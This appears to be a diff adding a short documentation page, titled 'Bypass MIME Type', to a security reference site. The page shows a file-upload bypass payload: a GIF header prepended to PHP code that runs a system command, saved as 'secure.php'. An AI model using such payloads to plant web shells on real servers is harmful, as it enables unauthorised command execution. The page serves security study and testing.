@@ -1,0 +1,13 @@
+---
+title: Bypass MIME Type
+---
+import { Code } from '@astrojs/starlight/components';
+
+export const exampleCode = `GIF89a;
+<?php
+  system('whoami');
+?>`;
+export const fileName = 'secure.php';
+export const highlights = ['file', 'CMS'];
+
+<Code code={exampleCode} lang="php" title={fileName} mark={highlights} />
